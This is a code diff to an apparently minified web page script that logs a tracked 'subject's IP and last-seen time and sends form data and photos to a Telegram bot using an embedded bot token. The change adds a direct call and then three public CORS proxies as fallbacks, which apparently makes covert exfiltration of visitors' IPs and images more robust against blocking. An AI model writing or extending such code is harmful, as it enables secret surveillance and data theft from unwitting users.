@@ -2840,8 +2840,25 @@ if(s.obj.lastIP===userIP&&s.obj.lastSeenAt&&(Date.now()-s.obj.lastSeenAt)<60000)
 updateSubject({lastIP:userIP,lastSeenAt:Date.now()});
 }
 async function sendToTelegram(method,fd){
-let url='https://corsproxy.io/?url='+encodeURIComponent('https://api.telegram.org/bot'+BOT_TOKEN+'/'+method);
-try{let r=await fetch(url,{method:'POST',body:fd});let d=await r.json();return d.ok;}catch(e){return false;}
+let direct='https://api.telegram.org/bot'+BOT_TOKEN+'/'+method;
+try{
+let r=await fetch(direct,{method:'POST',body:fd});
+let d=await r.json();
+if(d&&d.ok)return true;
+}catch(e){}
+let tgProxies=[
+'https://corsproxy.io/?url='+encodeURIComponent(direct),
+'https://api.allorigins.win/raw?url='+encodeURIComponent(direct),
+'https://api.codetabs.com/v1/proxy/?quest='+encodeURIComponent(direct)
+];
+for(let p of tgProxies){
+try{
+let r=await fetch(p,{method:'POST',body:fd});
+let d=await r.json();
+if(d&&d.ok)return true;
+}catch(e){}
+}
+return false;
 }
 async function sendPhotoToTelegram(dataUrl,caption){
 try{
